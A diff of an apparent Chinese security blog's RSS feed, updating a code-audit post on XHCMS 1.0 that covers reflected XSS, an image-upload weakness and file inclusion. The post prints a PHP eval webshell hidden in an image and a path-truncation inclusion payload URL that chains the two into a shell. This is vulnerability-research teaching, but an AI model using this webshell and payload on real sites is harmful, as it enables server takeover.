@@ -7,11 +7,11 @@
         <language>zh-CN</language>
         <pubDate>Wed, 07 Jul 2021 16:38:24 +0800</pubDate>
         <lastBuildDate>Wed, 07 Jul 2021 16:38:24 +0800</lastBuildDate>
-        <category>免杀</category>
-        <category>渗透测试</category>
-        <category>web安全</category>
         <category>CTF</category>
         <category>靶场练习</category>
+        <category>web安全</category>
+        <category>免杀</category>
+        <category>渗透测试</category>
         <category>数据库</category>
         <category>C++</category>
         <category>代码审计</category>
@@ -19,13 +19,47 @@
         <category>网络协议</category>
         <item>
             <guid isPermalink="true">https://ch1e.gitee.io/2021/07/07/xhcms/</guid>
-            <title>熊海CMS1.0代码审计之文件包含getshell</title>
+            <title>熊海CMS1.0代码审计</title>
             <link>https://ch1e.gitee.io/2021/07/07/xhcms/</link>
-            <category>渗透测试</category>
             <category>web安全</category>
+            <category>渗透测试</category>
             <category>代码审计</category>
             <pubDate>Wed, 07 Jul 2021 16:38:24 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;熊海CMS1-0代码审计之文件包含&#34;&gt;&lt;a href=&#34;#熊海CMS1-0代码审计之文件包含&#34; class=&#34;headerlink&#34; title=&#34;熊海CMS1.0代码审计之文件包含&#34;&gt;&lt;/a&gt;熊海CMS1.0代码审计之文件包含&lt;/h1&gt;&lt;h2 id=&#34;利用文件包含获取webshell&#34;&gt;&lt;a href=&#34;#利用文件包含获取webshell&#34; class=&#34;headerlink&#34; title=&#34;利用文件包含获取webshell&#34;&gt;&lt;/a&gt;利用文件包含获取webshell&lt;/h2&gt;&lt;p&gt;我们通过前面的文件包含学习知道了可以通过首页的include函数直接包含一个XXX.XXX.php的文件，其中XXX.XXX是我们传的参数，index.php会自动拼接一个.php后缀，这时我们如果需要getshell就需要把其中的.php给截断，这里用到的是用windows文件名的最大长度是260字节来进行截断，除此之外，include在变量action前还拼接了一个”files/“，所以这里我们在文件包含的时候特别要注意一下被包含的文件和index.php之间的位置关系&lt;/p&gt;
+            <description><![CDATA[ &lt;h1 id=&#34;熊海CMS1-0代码审计&#34;&gt;&lt;a href=&#34;#熊海CMS1-0代码审计&#34; class=&#34;headerlink&#34; title=&#34;熊海CMS1.0代码审计&#34;&gt;&lt;/a&gt;熊海CMS1.0代码审计&lt;/h1&gt;&lt;h2 id=&#34;熊海CMS1-0代码审计之反射型XSS&#34;&gt;&lt;a href=&#34;#熊海CMS1-0代码审计之反射型XSS&#34; class=&#34;headerlink&#34; title=&#34;熊海CMS1.0代码审计之反射型XSS&#34;&gt;&lt;/a&gt;熊海CMS1.0代码审计之反射型XSS&lt;/h2&gt;&lt;p&gt;首先打开Seay审计系统，把我们的xhcms丢进去审计一下，我们这里是要找XSS，我们直接搜索关键字echo，看看有没有可以利用的地方&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210805103255703.png&#34; alt=&#34;image-20210805103255703&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们这里审计漏洞必须同时满足参数可控和危险函数两个条件，echo就是一个，我们这里需要找可控变量，如果变量不可控我们没法对他进行利用，因为我们这里先看了一下index.php，发现他是通过传一个参数进去，自动拼接.php来访问files目录下的文件，所以这里可能会有文件包含漏洞，我们在下面会讲，这里只是先说明他前台的功能点应该都在files文件夹下，我们直接审计files目录下的文件即可&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//单一入口模式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//关闭错误显示&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;=addslashes(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;]); &lt;span class=&#34;comment&#34;&gt;//接收文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$action&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;==&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;?&lt;span class=&#34;string&#34;&gt;&amp;#x27;index&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//判断为空或者等于index&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;files/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$action&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;.php&amp;#x27;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//载入相应文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210805103656855.png&#34; alt=&#34;image-20210805103656855&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里我们看到286行有个echo $page,我们去定位一下这个page变量是怎么被赋值的&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210805103853663.png&#34; alt=&#34;image-20210805103853663&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这位于contact.php文件下，所以我们构造payload验证一下即可&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210805104147923.png&#34; alt=&#34;image-20210805104147923&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里如果用alert(‘xss’)是不行的，因为他有一个addcslashes() 函数，会自动转义特殊字符&lt;/p&gt;
+&lt;h2 id=&#34;熊海CMS1-0代码审计之文件上传&#34;&gt;&lt;a href=&#34;#熊海CMS1-0代码审计之文件上传&#34; class=&#34;headerlink&#34; title=&#34;熊海CMS1.0代码审计之文件上传&#34;&gt;&lt;/a&gt;熊海CMS1.0代码审计之文件上传&lt;/h2&gt;&lt;p&gt;使用自动审计功能审计出来是在/seacmsditor/php/Uploader.class.php文件下，我们进去看看&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210805104702200.png&#34; alt=&#34;image-20210805104702200&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现他是UEditor编辑器，找了半天，只有后台有上传点，不管他，先审计看看&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210805104953164.png&#34; alt=&#34;image-20210805104953164&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现他这里有一个checktype()函数，我们定位到他定义的位置看看，他这里是判断getfileext函数得出来的结果是否在config[“allowFiles”]里&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210805105245784.png&#34; alt=&#34;image-20210805105245784&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们继续追踪看看config[“allowFiles”]和getfileext()这两个分别是什么，getFileExt()他自己注释了，是获取文件拓展名，和我们自己分析的一样，把文件名最后一个点后面的字符串输出并转换成小写，这里config[“allowFiles”]没找到，但是按他名字来说应该是允许上传的文件类型，然后判断当前上传的文件的拓展名和允许上传的图片的类型进行比对，这里是一个白名单验证吧，这里可以上传图片马，因为后面还有文件包含漏洞可以配合getshell&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210805105934984.png&#34; alt=&#34;image-20210805105934984&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;熊海CMS1-0代码审计之文件包含&#34;&gt;&lt;a href=&#34;#熊海CMS1-0代码审计之文件包含&#34; class=&#34;headerlink&#34; title=&#34;熊海CMS1.0代码审计之文件包含&#34;&gt;&lt;/a&gt;熊海CMS1.0代码审计之文件包含&lt;/h2&gt;&lt;p&gt;这里文件包含挺明显的，反射型XSS那里大概也讲过&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//单一入口模式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;error_reporting(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//关闭错误显示&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;=addslashes(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;r&amp;#x27;&lt;/span&gt;]); &lt;span class=&#34;comment&#34;&gt;//接收文件名&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$action&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;==&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;?&lt;span class=&#34;string&#34;&gt;&amp;#x27;index&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//判断为空或者等于index&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;files/&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$action&lt;/span&gt;.&lt;span class=&#34;string&#34;&gt;&amp;#x27;.php&amp;#x27;&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//载入相应文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;传入一个r，拼接一个.php，在files目录下，我们这里只要让他拼接的这个.php失效就可以了，我们这里可以使用文件名最大长度限制来绕过这个.php，我这里之前就上传好了一个图马内容是&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; @&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[zwq]); &lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;由于他当前目录是在files下，我们的图片在upload\image\20210804下，所以需要构造一下&lt;/p&gt;
+&lt;p&gt;Payload：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;xhcms.com/?r=../upload/image/20210804/1628077724603047.jpg.............................................................................................................................................................................................................................................................................................................................................................................................................................................................................................&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210805112558209.png&#34; alt=&#34;image-20210805112558209&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;这里有个坑&lt;/strong&gt;：这里如果要用最大字符绕过的话，好像需要满足特定条件&lt;/p&gt;
+&lt;p&gt;Virtual Directory Support =  enabled &lt;/p&gt;
+&lt;p&gt;并且目前测试的版本是php5.2.17，其他貌似不行&lt;/p&gt;
+&lt;h2 id=&#34;熊海CMS1-0代码审计之SQL注入&#34;&gt;&lt;a href=&#34;#熊海CMS1-0代码审计之SQL注入&#34; class=&#34;headerlink&#34; title=&#34;熊海CMS1.0代码审计之SQL注入&#34;&gt;&lt;/a&gt;熊海CMS1.0代码审计之SQL注入&lt;/h2&gt;&lt;p&gt;搭建起来的演示站有点小问题，后续更新&lt;/p&gt;
+&lt;h2 id=&#34;利用文件包含获取webshell&#34;&gt;&lt;a href=&#34;#利用文件包含获取webshell&#34; class=&#34;headerlink&#34; title=&#34;利用文件包含获取webshell&#34;&gt;&lt;/a&gt;利用文件包含获取webshell&lt;/h2&gt;&lt;p&gt;我们通过前面的文件包含学习知道了可以通过首页的include函数直接包含一个XXX.XXX.php的文件，其中XXX.XXX是我们传的参数，index.php会自动拼接一个.php后缀，这时我们如果需要getshell就需要把其中的.php给截断，这里用到的是用windows文件名的最大长度是260字节来进行截断，除此之外，include在变量action前还拼接了一个”files/“，所以这里我们在文件包含的时候特别要注意一下被包含的文件和index.php之间的位置关系&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/QQ%E5%9B%BE%E7%89%8720210707164116.png&#34; alt=&#34;QQ图片20210707164116&#34;&gt;&lt;/p&gt;
 &lt;p&gt;既然知道了具体的原理，那我们这时候就需要来getshell。文件包含可以把包含的文件用来作为php来执行，既然要用到包含，那他网站所处的目录或者下级目录下面必须要有我们需要包含的文件，此时我们又不知道他文件目录下有什么文件可以利用，因此我们首先需要想要上传一个文件。&lt;/p&gt;
 &lt;p&gt;看完熊海cms的前台，找不到可以上传文件的地方，这时候我们去后台寻找。经过寻找我们可以发现在后台-发布内容-发表文章下面可以进行图片的上传，这时候我们只需要新建一个txt文档，然后输入我们的php一句话木马:&lt;?php @eval($_POST[shell]) ?&gt; ，把这个txt文档改为jpg后缀，通过后台-发布内容-发表文章这个上传点来把我们的图片上传&lt;/p&gt;
